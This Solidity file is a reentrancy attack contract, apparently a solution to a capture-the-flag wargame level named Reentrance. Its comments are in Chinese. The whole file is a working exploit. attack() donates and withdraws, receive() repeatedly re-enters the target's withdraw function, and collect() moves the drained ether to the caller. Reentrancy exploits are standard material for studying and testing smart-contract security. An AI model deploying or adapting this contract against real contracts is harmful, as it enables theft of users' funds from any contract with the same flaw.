// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceAttacker {
    IReentrance public target;
    uint256 public attackAmount;  // 0.001 ETH

    constructor(address payable _target) {
        target = IReentrance(_target);
    }

    // 記得參數 _to 填入此合約帳戶的地址
    // Reentrance 的初始餘額是 0.001 ETH，要捐贈大於等於 0.001 ETH 
    // 使得 balances[msg.sender] >= _amount 才能發動重入攻擊
    function donate(address _to) public payable {
        target.donate{value: msg.value}(_to);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return target.balanceOf(_who);
    }

    function withdraw(uint256 _amount) public {
        attackAmount = _amount;
        target.withdraw(_amount);
    }

    // 發動攻擊的入口函式，捐款後立即嘗試提領資金
    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    // 用於提取攻擊合約中累積的以太幣
    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        target.withdraw(msg.value);
    }

}

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}